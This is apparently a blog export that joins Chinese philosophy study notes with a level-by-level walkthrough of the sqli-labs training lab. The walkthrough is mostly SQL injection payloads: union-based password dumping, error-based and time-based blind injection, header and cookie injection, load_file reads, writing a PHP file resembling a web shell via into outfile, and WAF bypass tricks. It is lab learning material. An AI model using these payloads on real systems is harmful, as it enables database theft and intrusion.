Ad Absurdum. 演绎论证 Deductive Reasoning如果你的 前提 是真的，那么你的结论一定是真的。演绎论证 的厉害之处在于真实的 前提 必然会导出真实的 结论，当这发生时，我们称论证是有效的。 有效 并不等同于 真实有效 真正的意思是，如果 前提 为真，那么你的 结论 不可能为假。但这并不意味着，你的 前提 能证明 结论 是正确的。 有时 结论 只是恰好是真的而已一个完全有效的论证，仍然可以得到一个假的 结论，如果你的任何一个 前提 是假的。 演绎论证一直受到哲学家以及大量其他各种重要思想家的重视的原因在于：它是唯一一种能带给你真实确定性的论证。但它是有限制的，因为它只有当你开始于一个已知的真的 前提 时，才会奏效，这是很难遇到的。 3. 如何论证：归纳与溯因归纳 Induction总结过去的经验，并用来预测未来。归纳论证并不具有确定性，相反归纳论证关注可能性。归纳证据可能是错误或是矛盾的，它会让你以为可以预测未来，实际上不能。 溯因 Abduction“当排除掉所有的不可能之后，不论剩下的是什么，不论有多么不可能，那都一定是真相。”“When you have eliminated the impossible, whatever remains, however improbable, must be the truth.” 溯因是对最佳解释进行的推理。溯因并不直接由前提推导结论，相反，它通过排除可能的解释进行推理，直到你剩下基于证据最有可能的答案。就像归纳推理，溯因推理并不具有确定性。但真的是一个很有用的解决困境的方法，尤其当你没有来自过去的明确的证据能帮助你时。 溯因 必须小心谨慎使用。它只能利用你现在已知的信息。（所以医生和侦探非常努力挖掘更多数据，还原过去的事件，这样他们就能得出更好的结论。） 4. 现实的本质洞穴比喻 Plato’s famous myth of the cave省略… 我们的错误，是认为平凡世界中的物质客体是最真实的东西。 表象与现实的关系 The relationshiop between appearance and reality思考什么真正是真实的，而不是你以为什么是真的，以及你怎样才能知道这两者的区别。 有没有可能，我现在所处的现实，并不是真实的？Is it possible that my current reality isn’t real at all? 5. 笛卡尔与怀疑主义意识到过去相信的事是错的，让笛卡尔开始思考。因为当他相信这些事时，他并没有意识到它们是错的，那么如果现在他仍然相信的一些事情同样是错的，但他还没意识到这一点，他要如何才能知道自己相信的就是正确的呢？ 笛卡尔意识到，能确保自己没有相信如何错误事情的唯一方法就是不相信任何事情。 局部怀疑：自我检查，弄清楚自己正在经历错觉骗局的能力。（类似于做梦醒来以后能意识到刚刚自己是在做梦）这是关于特定感觉经验的怀疑，或对其他特定时间内发生事情的怀疑。普遍怀疑：无法置身事外跳出检查的怀疑。（类似于一切可能都是骗局，每个人从生到死都在经历相同的虚假现实） 极端怀疑主义：无法相信自己任何信念。 6. 洛克、贝克莱与经验主义洛克的第一性质和第二性质洛克为了搞清楚感官是否准确反应外部世界，他提出了所有事物都具有第一性质和第二性质。第一性质是物理客体本身具有的性质，这些物质不在我们的脑中，实际存在于物质中。（类似物体的硬度、密度、重量和质量..第二性质，根据洛克的标准，第二性质不是真实的，至少在客观上无法达成一致。第二性质存在我们脑内，但却是通过第一性质产生的。（类似于颜色、味道、纹理、气味、声音.. 洛克相信第一性质和第二性质的区别解释了我们对外部世界的感知会产生分歧的原因。 我们可以用不同方式测量物体，都会对第一性质达成一致。但它的第二性质常常会引发争议。 贝克莱的反驳贝克莱开始于拆解洛克提出的第一性质和第二性质的区别。他提出，你不能感知物体的某些性质，同时完全忽略其他性质。你无法发现任何第一性质的同时而不考虑第二性质。（类似于你无法看到没有颜色的苹果如果你试图抽出苹果的第二性质，来获得第一性质，你就根本不会有苹果。这意味着..第一性质也不可能是真实的，它们同样只是你大脑产生出的东西。 贝克莱：“物质”这种东西是不存在的，它不可能存在，相反，存在的只有“感知”。“存在，就是被感知。” 7. 知识的意义为了能在哲学辩论中捍卫自己的观点，你必须知道两个听上去完全一样的词的区别：断言Assertion和命题Proposition。 你需要能够区分，一个人真的知道自己所说的是什么 和 一个人仅仅是相信自己所说的可能是真的。断言是一种语言行为，赋予真值。真值并不是衡量一样东西到底有多么正确，而仅仅是表明事物为真、假或不确定的一种状态。 你可以拥有 错误信念，但你无法拥有错误的 知识。如果你认为你所知道的事情，事实证明不是真的。那么事实是，你从未知道它，你只是相信它。 盖蒂尔问题：你恰好蒙对正确答案，并不意味着你真的知道。 盖蒂尔问题版本之一：你看见草原上有一个物体长得很像羊，你形成信念，草地上有一只绵羊。事实上，那是一只狗。但是在山丘挡住你看不见的视野里，草地上确实有只羊。所以你有了证实的真信念，但是对于你的真信念，你所看见的物体并不是绵羊，你只是恰好蒙对了。 8. 卡尔·波普尔，科学与伪科学波普尔观测弗洛伊德与爱因斯坦所做科学的区别，发现爱因斯坦需要观测未来证明自己的理论是正确的，而弗洛伊德总是可以用不同的方式解读过去，从而一定程度上继续证明自己的理论。 波普尔则认为后者是伪科学。波普尔认为，每个人都有一定程度的先入为主，我们都是从直觉开始观察，无论承认与否。毕竟，决定观察什么，取决于你先前是否已经产生了足够的兴趣，而你对此如此感兴趣，就意味着你已经有了一些自己的想法。波普尔认为弗洛伊德这种，为证实思想而服务的方法是伪科学，这种方法可以被用来证明任何事情。波普尔认为只有通过寻找能反驳圣诞老人存在的证据，你才能证明他不存在。当我们开始检验一个理论，我们是努力去证实，还是证伪？波普尔认为，科学 证伪，伪科学 证实。 如果你是科学家，你就必须甘愿放弃你的信念，接受证据，继续前进，这件事我们如今接受的现代科学思想。可检验，可反驳，可证伪。你不用努力证明科学假设是正确的，你只用证明它们是错误的。 对于波普尔来说，知识关乎 概率 和 视情况而定，我们合理相信，当前数据得出的最 有可能 的结果。我们应该总是乐于在新的证据面前，颠覆我们的信念。换句话说，我们的信念应该随数据本身而变化。笛卡尔对此不满意，他总是关心事物的确定性。但波普尔并不认为 确定性 从根本上是可能存在的，他认为确信某件事会使你封闭自己的思想。永远对“你当前的信念可能是错误的”这个观点持开放态度是你接近真理的最好途径。 9. 安瑟伦，与论证上帝哲学家不会把任何事情当做前提，包括宗教信仰。所有的一切都是可以讨论的，所有的一切都需要论证。 信念 从根本定义上就是不可证明的，所以信念从哲学的角度讲，是没有价值的。 10. 阿奎纳与论证宇宙论证一 运动论证：一切运动，都由其他事物推动，不存在无限倒退的推动者。所以必须存在第一推动者，其自身是不动的，这就是上帝。 论证二 起因论证：一些事物是被引起的，任何被引起的事物，都由其他事物引起，因为没有事物会引起自己，不存在无限倒退的起因，所以必须存在 第一起因，其自身不会被引起，这就是上帝。 论证三 偶然性论证：我们世界不能一切都是偶然的，因为这样的话，根据定义，一切可以很容易地从未存在过。所以至少需要一个 必然存在，一个过去现在存在，未来继续存在，不可能不存在的存在，来维持一切进行，这个必然存在就是上帝。偶然的事情，可以引起其他偶然的事情，但世界上不是只有偶然的事情，否则这就意味着，偶然性会无限倒退，有可能一切根本都不会发生，无限倒退是不可能的，所以至少有一个 必然存在，那就是上帝。 论证四 等级论证：属性来自于等级，为有一个象征“完美”的等级，必须存在不依赖其他如何事物衡量的标准的“完美”，上帝就是完美的顶峰。 对 阿奎纳 的论证最致命的攻击是其自相矛盾，它们实际上证明了自己是错误的。举个例子，如果“一切运动由其他事物引起”是正确的，那么一切事物，都必然有一个除自身之外的起因。这样的话，上帝似乎应该遵循同样的规则，如果上帝不受这些规则的约束，那么其他的事物，为什么就要受到约束呢？ 11. 智慧设计目的论证：目的 意味着目标导向，有意图的，我们很容易就能看出人造物品的目的。杯子的目的暗示着杯子制造者的存在，一块中标暗示着钟表匠的存在。佩里 看见世界的 目的，并从中假设，上帝存在。 佩里说，人体是有目的的，由此得出结论，人体的目的是由只会的造物者设计的。但是对人体入籍你的复杂性和功能性的另一种解释，是自然选择和随机突变。 12. 上帝是什么样子的“你不是什么也做不到，如果你真的什么也做不到的话，那你应该同样你做不到让自己什么也做不到，既然你能做到这种事，那就不是什么也做不到。” 13. 恶的问题神义论 是尝试证明恶的存在并不排除上帝存在的可能性。 希克认为，上帝有意识的把我们创造为“不完全的”，我们在地球上的生活是为了锻炼我们成长，就像是训练营。生活的艰难，赋予我们坚韧的品格和意志，这只有在不完美的世界中才可能实现。我们不是上帝的小宠物，他并不是我们仁慈的主人，主人唯一的工作就是保护我们在一个安全舒适的环境中成长。相反，他希望训练我们，塑造我们成为一种特定的存在，所以我们需要环境，来提供他所期望的成长。 14. 阴谋论与认识责任阴谋论与认识责任认识责任：我们对自身的信念要负责。 琼斯与帕斯卡的赌注实用主义：发现 真实的信念，没有发现对生活有帮助的信念重要。 “信仰上帝最美妙的地方在于，这是完全非理性的，你不能用大脑分析和推理。” 15. 存在哲学存在主义存在先于本质 萨特认为，不是世界缺乏意义，而是世界充满让人恐惧的自由。毕竟，如果没有任何行动纲领指导我们的行为，那么我们每个人都不得不设计一套自己的道德准则，创造自己遵循的道德观。你也许认为存在某些权威，可以去询问答案，但所有这些你能想到的权威，都是假的。这些权威实际上只是和你一样的人，一样没有任何答案的人，一样必须自己探索如何生活的人。 他的选择，不论是什么，但是唯一真正的选择，只要他真实的按照自己意愿去选，因为这取决于他自己选择接纳的价值。 对死亡的看法苏格拉底 并不认为我们能够搞清楚人死后是否有来生，但他认为，人死后其实只有两种可能。死亡要么是不做梦的睡一觉，要么是一条通往另一种生活的路。前者听上去可以好好休息，后者听上去也很好，因为这样就可以和已经死掉的有趣的人一起玩了。 死亡是感知的终止，好的坏的都只有能感知到才有意义，所以死亡既不好也不坏。邪恶糟糕的事情，只有当人感觉不好才是真的不好。生活就像在死亡宿醉之前喝了一夜的酒，死亡不可避免，但你永远不会真的感觉体验到。 托马斯·内格尔 指出，有些人害怕死亡，因为他们会错过一些想要体验的东西。但想想，有趣的事情早在你出生前就已经开始了，你已经错过了。如果你没有对错过出生之前的事情有深刻的遗憾，为什么你会遗憾错过你死后发生的事情？ 你认为生命真正的价值是什么，这同样影响你对死亡的一般看法，或者你如何看待特定的人的死亡。如果你说，生命本质总是美好的，那么你就是高度重视 生命的神圣，生命内容如何，这个人是什么样并不重要，仅仅是活着的事实就足够美好了。如果你认为 生命的质量 才是重要的东西，那么你就会想要区分充满美好经历的生命，和痛苦不堪的生命。你并不认为，仅仅是活着就有价值。这样来看，有些死亡可能实际上是积极有价值的。比如如果死亡能给痛苦万分的存在带来解脱的话。当然这可能给对死亡本身的恐惧带来了意义，因为垂死的过程会痛苦、漫长，要做许多艰难的告别。 庄子认为，为何恐惧必然。死亡不过是类似于成长中其他的里程碑，是另一种转变。相反，你应该庆所爱之人的死亡，就像你庆祝他们经历过的其他生命的变化，你应该把他们的死，看做是一场伟大旅行的送别会。 同一性忒休斯之船，一条船在旅途中不断更换零件和船员，直到全部换新，它还是之前的那个船吗？ 哲学家把 同一性 描述为，事物只与本身存在的关系。任何使事物独一无二成为自己的东西，就定义了事物的同一性。 一个理解同一性，解释物体如何保持跨时间的一致性的方法，是区分我们所说的 本质属性 和 偶然属性。本质属性：事物成为自己所必须的核心属性。偶然属性：可以从物体身上拿走而不会使物体变成另一样东西的特征。 许多思想家拒绝整个 本质属性 的概念，存在主义者拒绝本质属性的根本存在。赫拉克利特有一句名言：“你无法两次踏入同一条河中”意思是，没有事物与自身是同一的，因为一切事物，包括你与河，都在不断变化中。所以那个船不仅在返回时是新的，而是它在第一次有任何变化发生的时候，就已经是新的船了。 可替代性，同一追的物体可以彼此互换的属性。大多数人认为，钱是可替代的，因为钱只是它所代表的 价值 的载体。价值 才是我们真正在乎的。 哲学家在 人格同一性 这个问题上挣扎了很长时间，试图找到那个特殊的东西，那个本质属性，使你成为你，维持着你的同一性，跨越时间，跨越所有随时间产生的变化。 肉体理论认为，人格同一性 跨时间保持一致，因为你从出生到死亡，都一直在同一副肉体之中。但实际上你并不是一直拥有和出生时候完全相同的身体构成，举个例子，你的外层皮肤一直脱落和替换了上百次。你一直在被新的生理版本的自己所替换。 对于洛克来说，使你成为你的，是非生理的东西，是你的意识。人格同一性的 记忆理论：他相信，你的同一性 跨时间一致，因为你保持着自己在不同时间点的记忆，每个时间点的记忆都与前一个记忆彼此相连。 但如果人格同一性 需要记忆，那么我们没有人会形成第一段记忆前成为自己。这意味着，我们全都至少丢失了人生最初的几年。 无论是肉体理论还是记忆理论都相当脆弱，但，这些真的重要吗？但 人格同一性 并非只是一个概念难题，它同样深刻的重要，当你思考应该如何过自己的生活。事实上，我们的生活、社会都建立于一个预期 个体会持续是他们自己，不会改变，人们同样期待你也是如此。 休谟认为，自我的概念并不会跨时间保持一致，不存在一个你，从出生到死亡都是同一个人。自我的概念不过是幻觉。不存在唯一不变的你，那意味什么？意味誓言可以被违背。 休谟说，我们都只不过是不断变化的一捆形象，我们的大脑欺骗自己一直没有改变，因为这些印象打包装在每天看上去都差不多一样的肉体容器中。 帕菲特：”当然，我不再是小学时候的我了，未来当我死去时，我也不会是同一个人，我甚至都不是说这句话之前的那个我了，因为每个经历都会改变我们，至少改变一点点。“但有一部分的我，随时间流逝幸存下来，因为它们与之前的我有着心理联结，幸存下来 正是重要所在。只要有足够你的元素仍然存在，你会把自己，看做是相对不变的。但不会一生不变。帕菲特说，没有任何一个你，从出生开始到现在仍然存在，你的生理组成几乎完全不同，你没有刚出生的记忆，你的喜好已经完全改变。 如果不存在跨时间不变的我，我该如何理解承诺、义务和责任？帕菲特理论答案：“你的责任和义务，与你跟许下承诺、承担责任的那个人的连结，相对应。”小时候恶霸，长大成了暖男，就可以不用对其负责。他们认为，婚姻契约应该是有期限的，可以选择续约。其他人则说，像婚姻誓言，实际上可以保持相对性，即使在一生的变化之后。你可以持续地重新许下你在结婚典礼上的承诺。所以，结婚誓言并不是你多年前所说的一句话，不是完全不同的另一个人的诺言，而是你每个早餐许下的承诺，当你丢垃圾，清理猫毛.. 人菲尼亚斯·盖齐的故事，给哲学家带来了启发。它给我们提供了一些十分稀有罕见的证据，我们一部分人从古至今，认为是非物理的东西 —— 我们的人格，实际上直接受到我们身体物理变化的影响。 当我们看见有人表现出非常像我们的行为，表现出诸如意向性和理解力，我们就假设他们拥有意向性和理解力。 决定论（强决定论）：你所做的一切决定，都是已经事先被决定好的。 自由意志：你可以自由选择自己做的任何事情。 相容论（弱决定论）：像强决定论，宇宙遵循定律一般的秩序，过去决定未来，但他们同样认为，有一些人类行动是有些不同的，有一些我们的行动，确实是自由的。 亚里士多德对所有美德的看法都是这样，正确行为总是两个极端之间的完美平衡点。 哲学上很多问题是没有答案的，思考的过程就是“答案”。","categories":[{"name":"哲学","slug":"哲学","permalink":"https://yeyeyeyeto.github.io/categories/%E5%93%B2%E5%AD%A6/"}],"tags":[]},{"title":"sqli-labs 通关笔记","slug":"security/sqli-labs","date":"2024-06-15T20:13:28.000Z","updated":"2024-06-15T12:30:29.128Z","comments":true,"path":"安全/2024-06-16-security/sqli-labs.html","permalink":"https://yeyeyeyeto.github.io/%E5%AE%89%E5%85%A8/2024-06-16-security/sqli-labs.html","excerpt":"","text":"查库：select schema_name from information_schema.schemata查表：select table_name from information_schema.tables where table_schema&#x3D;’security’查列：select column_name from information_schema.columns where table_name&#x3D;’users’查字段：select username, password from security.users Less1123456789101112131415161718192021222324252627282930313233343536373839404142434445464748传入ID值，页面正常，查看是否有注入http://192.168.8.1/sqli-labs/Less-1/?id=1 添加单引号，页面出错http://192.168.8.1/sqli-labs/Less-1/?id=1&#x27; 添加注释，页面回归正常http://192.168.8.1/sqli-labs/Less-1/?id=1’ --+ 测试看数据中共有多少列http://192.168.8.1/sqli-labs/Less-1/?id=1’ order by 3 --+ 选择3列(有多少选多少)，没有回显信息。http://192.168.8.1/sqli-labs/Less-1/?id=1’ union select 1,2,3 --+ 使前面的ID值报错(给零或负数都可以)，查看哪些数据可以回显http://192.168.8.1/sqli-labs/Less-1/?id=-1’ union select 1,2,3 --+ 查看当前数据库http://192.168.8.1/sqli-labs/Less-1/?id=-1’ union select 1,2,database() --+ 可以看到表的名字http://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,schema_name from information_schema.schemata --+ 使用limit可以查看别的位置的表名 使用group_concat可以看到所有的表名http://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,schema_name from information_schema.schemata limit 2,1 --+ 查看security表中的信息http://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata --+ security改为16进制格式：在前面添加0x，选择security - Encoding - Hex Encodehttp://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+ 查userhttp://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0xsecurity --+ 取出passwordhttp://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0xusers --+ 使用group_concat取出所有passwordhttp://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,password from security.users --+ 使用concat_ws连接password和username，再使用group_concat取出全部http://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,group_concat(password) from security.users --+ 对concat_ws中的参数进行16进制转换，选择字符转换后添加0x前缀，去掉引号http://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,group_concat(concat_ws(&#x27;~&#x27;,username,password)) from security.users --+ http://192.168.8.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,group_concat(concat_ws(&#x27;~&#x27;,username,password)) from security.users --+ Less2123http://192.168.8.1/sqli-labs/Less-2/?id=1 and 1=1 --+http://192.168.8.1/sqli-labs/Less-2/?id=1 and 1=2 --+http://192.168.8.1/sqli-labs/Less-2/?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+ Less31234http://192.168.8.1/sqli-labs/Less-3/?id=1&#x27;) --+http://192.168.8.1/sqli-labs/Less-3/?id=1&#x27;) order by 3 --+http://192.168.8.1/sqli-labs/Less-3/?id=-1&#x27;) union select 1,2,3 --+http://192.168.8.1/sqli-labs/Less-3/?id=-1&#x27;) union select 1,2,group_concat(concat_ws(&#x27;~&#x27;,username,password)) from security.users --+ Less4123http://192.168.8.1/sqli-labs/Less-4/?id=1&quot;) and 1=1 --+http://192.168.8.1/sqli-labs/Less-4/?id=1&quot;) and 1=2 --+http://192.168.8.1/sqli-labs/Less-4/?id=-1&quot;) union select 1,2,3 --+ Less5布尔盲注 获取数据库名字的长度 ?id&#x3D;1’ and length(database())&#x3D;{} –+ 获取数据库的名字 ?id&#x3D;1’ and left((select database()),{})&#x3D;’{}’ –+ 获取数据库中的表 获取库中表的个数 ?id&#x3D;1’ and (select count(*) tables from information_schema.tables where table_schema&#x3D;’{}‘)&#x3D;{} –+ 获取每个表名称的长度 ?id&#x3D;1’ and (select length(table_name) from information_schema.tables where table_schema&#x3D;’{}’ limit {},1)&#x3D;{} –+ 获取每个表的名称 ?id&#x3D;1’ and left((select table_name from information_schema.tables where table_schema&#x3D;’{}’ limit {},1),{})&#x3D;’{}’ –+ 获取表中的列 获取列的个数 ?id&#x3D;1’ and (select count(*) columns from information_schema.columns where table_name&#x3D;’{}’)&#x3D;{} –+ 获取列名称的长度 ?id&#x3D;1’ and (select length(column_name) from information_schema.columns where table_name&#x3D;’{}’ limit {},1)&#x3D;{} –+ 获取列的名称 ?id&#x3D;1’ and left((select column_name from information_schema.columns where table_name&#x3D;’{}’ limit {},1),{})&#x3D;’{}’ –+ 取出列表中的元素 元素的个数 ?id&#x3D;1’ and (select count(}) from {}.{})&#x3D;{} –+ 元素的长度 ?id&#x3D;1’ and (select length({}) from {}.{} limit {},1)&#x3D;{} –+ 元素的名称 ?id&#x3D;1’ and left((select {} from {}.{} limit {},1),{})&#x3D;’{}’ –+ 报错盲注123456789101112131415http://127.0.0.1/sqllib/Less-5/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0 x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+利用 double 数值类型超出范围进行报错注入http://127.0.0.1/sqllib/Less-5/?id=1&#x27; union select (exp(~(select * FROM(SELECT USER())a))),2, 3--+利用 bigint 溢出进行报错注入 http://127.0.0.1/sqllib/Less-5/?id=1&#x27; union select (!(select * from (select user())x) - ~0),2,3- -+ xpath 函数报错注入http://127.0.0.1/sqllib/Less-5/?id=1&#x27; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) --http://127.0.0.1/sqllib/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) --利用数据的重复性http://127.0.0.1/sqllib/Less-5/?id=1&#x27;union select 1,2,3 from (select NAME_CONST(version(),1), NAME_CONST(version(),1))x --+ 延时盲注12345利用 sleep()函数进行注入http://127.0.0.1/sqllib/Less-5/?id=1&#x27;and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+当错误的时候会有 5 秒的时间延时。 利用 BENCHMARK()进行延时注入http://127.0.0.1/sqllib/Less-5/?id=1&#x27;UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BEN CHMARK(50000000,ENCODE(&#x27;MSG&#x27;,&#x27;by 5 seconds&#x27;)),null)),2,3 FROM (select database() as cur rent) as tb1-- Less6‘换” Less7load_file() 读取本地文件 select load_file(‘C:\\phpstudy\\PHPTutorial\\WWW]]sqli\\Less-7\\test.txt’); into outfile() 写入文件 select ‘mysql is ver good’ into outfile ‘test1.txt’; select ‘crow 666’ into outfile ‘C:\\phpstudy\\PHPTutorial\\WWW\\sqli\\Less-7\\test.txt’; 可以将文件路径进行base64编码 12345http://127.0.0.1/sqllib/Less-7/?id=1&#x27;)) or 1=1--+ http://127.0.0.1/sqllib/Less-7/?id=1&#x27;))UNION SELECT 1,2,3 into outfile &quot;c:\\\\wamp\\\\www\\\\sqlli b\\\\Less-7\\\\uuu.txt&quot;%23http://127.0.0.1/sqllib/Less-7/?id=1&#x27;))UNION SELECT 1,2,&#x27;&#x27; i nto outfile &quot;c:\\\\wamp\\\\www\\\\sqllib\\\\Less-7\\\\yijuhua.php&quot;--+ http://localhost/sqli-labs/Less-7/?id=1&#x27;)) union select 1,2,&#x27;texxxxxxxxxxxxxxxxxt&#x27; into outfile &quot;D:\\\\Software\\\\phpStudy\\\\WWW\\\\sqli-labs\\\\Less-7\\\\test1.php&quot; --+ Less81234567891011使用延迟的方法判断是否存在注入漏洞http://localhost/sqli-labs/Less-8/?id=1&#x27; and sleep(5) --+当为8时加载很快，而为其他值时加载较慢（5s左右），说明此时数据库的长度就是8（security）http://localhost/sqli-labs/Less-8/?id=1&#x27; and if(length(database())=8,1,sleep(5)) --+如果当前数据库的第一个字母的ascii值大于113时，会立刻返回结果，否则执行5shttp://localhost/sqli-labs/Less-8/?id=1&#x27; and if(ascii(substr(select database(),1,1))&gt;113,1,sleep(5)) --+--+和# 注释有偏差，一般pose使用#号select if(ascii(substr((select database()),1,1))&gt;10,2,3)http://127.0.0.1/sqllib/Less-8/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+ http://127.0.0.1/sqllib/Less-8/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0 x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+ Less9123456789101112131415161718192021# 猜测数据库说明第一位是 s （ascii 码是 115）http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+ 说明第一位是 ehttp://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))--+ 以此类推，我们知道了数据库名字是 security# 猜测security的数据表猜测第一个数据表的第一位是 e,...依次类推，得到 emailshttp://127.0.0.1/sqllib/Less-9/?id=1&#x27;and If(ascii(substr((select table_name from information_s chema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))=101,1,sleep(5))--+ 猜测第二个数据表的第一位是 r,...依次类推，得到 referershttp://127.0.0.1/sqllib/Less-9/?id=1&#x27;and If(ascii(substr((select table_name from information_s chema.tables where table_schema=&#x27;security&#x27; limit 1,1),1,1))=114,1,sleep(5))--+ ... 再以此类推，我们可以得到所有的数据表 emails,referers,uagents,users# 猜测user表的列猜测 users 表的第一个列的第一个字符是 i， 以此类推，我们得到列名是 id，username，passwordhttp://127.0.0.1/sqllib/Less-9/?id=1&#x27;and If(ascii(substr((select column_name from information _schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=105,1,sleep(5))--+ # 猜测username的值猜测 username 的第一行的第一位 以此类推，我们得到数据库 username，password 的所有内容http://127.0.0.1/sqllib/Less-9/?id=1&#x27;and If(ascii(substr((select username from users limit 0,1), 1,1))=68,1,sleep(5))--+ Less10‘换“ 常用符‘‘)‘))““)“)) Less11admin’#admin’or’1’&#x3D;’1#1admin’ union select 1, database() # Less12admin”) Less13admin’) 盲注 admin’)and left(database(),1)&gt;’a’#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit Less14admin” admin”and left(database(),1)&gt;’a’#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit admin”and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;passwd&#x3D;1&amp;submi t&#x3D;Submit Less15admin’and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))#&amp;passwd&#x3D;11&amp;submit&#x3D;Submit 正确的时候可以直接登录，不正确的时候延时 5 秒。 Less16admin”) admin”)and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))#&amp;passwd&#x3D;11&amp;submit&#x3D;Submit updatexml(XML_document, XPath_string, new_value);XML_document：是string格式，为XML文档对象的名称，文中为DocXPath_string：Xpath格式的字符串new_value：String格式，替换查找到的符合条件的数据作用：改变文档中符合条件的节点的值改变XML_document中符合XPATH_string的值 select updatexml(1, concat(0x7e, (select username from security.users limit 0,1), 0x7e), 1);其中concat函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出 Dumb admin’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),0x7e),1) # Less17报错盲注uname&#x3D;admin&amp;passwd&#x3D;11’and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;sub mit&#x3D;Submit将@@version 换成你的子句就可以进行其他的注入了。 延时盲注uname&#x3D;admin&amp;passwd&#x3D;11’and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))#&amp;submit&#x3D;Submit Less18将 user-agent 修改为’and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’&#x3D;’1‘ or updatexml(1,concat(0x7e,(database())),1) and ‘1’&#x3D;’1 Less19将 referer 修改为’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and ‘1’&#x3D;’1 Less20修改 cookie 为 uname&#x3D;admin1’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#修改cookie可使用chrome插件 Cookie Editor Less21本关对 cookie 进行了 base64 的处理，其他的处理流程和 less20一样 我们这里可以利用 less20 同样的方法，但是需要将 payload 进行 base64 编码处理（注意这里对 uname 进行了 (‘uname’)的处理。 Cookie： uname&#x3D;YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2VkaXIpLDB4N2UpKSM&#x3D; Less22本关和 less20、less21 是一致的，我们可以从源代码中看到这里对 uname 进行了”uname”的处理，可以构造 payload：admin1”and extractvalue(1,concat(0x7e,(select database()),0x7e))#Payload 进行 base64 编码后，修改 cookie 再进行提交 Less23源码中对各种符号进行了过滤，所以这里只能使用and 或者 or来进行闭合。 但这里可以用一种特殊的注释符 ;%00可以通过这个注释符判断列数 123456789查看回显位置http://localhost/sqli-labs/Less-23/?id=-1&#x27; union select 1,2,3 ;%00http://localhost/sqli-labs/Less-23/?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata ;%00报错注入http://localhost/sqli-labs/Less-23/?id=1&#x27; and updatexml(1, concat(0x7e,(database())),1) or &#x27;1&#x27;=&#x27;1http://localhost/sqli-labs/Less-23/?id=1&#x27; and updatexml(1, concat(0x7e,(select schema_name from information_schema.schemata limit 2,1)),1) or &#x27;1&#x27;=&#x27;1http://localhost/sqli-labs/Less-23/?id=-1&#x27; union select 1,@@datadir,&#x27;3# Less24二次注入：攻击者构造的恶意数据存储在数据库后，恶意数据被读取后进入到SQL查询语句所导致的注入。扶着可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。 二次注入可以概括为以下两步： 插入恶意数据：进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。 引用恶意数据：开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。 例：输入参数 id&#x3D;1’ —— 传输转义 id&#x3D;1&#39; —— 此时转义之后无法注入 —— 存入数据库为1’ —— 再次取出直接闭合 本关中由于对数据库长度做了限制，所以本次只演示替换密码 实现我们先查询当前的user表，找到admin的密码 我们使用admin’#注册一个账号，再登录 修改admin的密码 Less25 白盒绕过 通过源代码分析，来进行绕过 黑盒绕过 架构层面绕过WAF 寻找源网站绕过WAF检测：主要针对的是云WAF，找到源网站的真实地址，进行绕过，有点像CDN 通过同网段绕过WAF防护：在一个网段中，可能经过的数据不会经过云WAF，从而实现绕过。 资源限制角度绕过WAF 一般WAF的执行需要优先考虑业务优先的原则，所以对于构造较大、超大数据包可能不会进行检测，从而实现绕过WAF。 协议层面绕过WAF 协议未覆盖绕过WAF：比如由于业务需要，只对GET型进行检测，POST数据选择忽略。 参数污染：index?id&#x3D;1&amp;id&#x3D;2 WAF可能只对id&#x3D;1进行检测 规则层面绕过WAF SQL注释符绕过 union &#x2F;**&#x2F; select 我们将union select之间的空格使用注释符进行替换 （适用于对union select之间的空格进行检测的情况） union&#x2F;crow%0%32&#x2F;select 我们在注释符中间填充内容 